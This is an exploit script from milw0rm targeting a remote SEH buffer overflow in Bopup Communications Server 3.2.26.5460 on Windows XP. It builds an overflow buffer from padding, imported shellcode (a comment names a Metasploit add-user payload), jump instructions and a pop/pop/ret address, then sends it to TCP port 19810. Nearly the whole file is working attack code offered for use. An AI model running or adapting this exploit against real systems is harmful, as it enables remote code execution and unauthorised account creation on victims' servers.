#!/usr/bin/python
#[*] Usage : python bopup.py [target_ip]
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : Bopup Communications Server (3.2.26.5460) Remote BOF Exploit (SEH)
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Refer	:	mu-b
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)


import socket,sys,struct

import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):


        host = target_machine



        # win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
       

        payload = b'\x01\x00\x00\x00'
        payload += b'\x41'*(821-len(buf))
        payload += buf
        payload += b'\x42'*27	#padding
        payload += b'\xE8\xFC\xFE\xFF\xFF' #Call back
        payload += b'\x43'*8	#padding, escaping from the \x00 monster :p
        payload += b'\xEB\xF1\xFF\xFF' #short jump
        payload += b'\xE0\x14\x40\x00' #p/p/r bcssrvc (universal)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                s.connect((host,19810))
        except:
                pass

        s.send(payload+b'\r\n')
    
        s.close()

        # milw0rm.com [2009-06-29]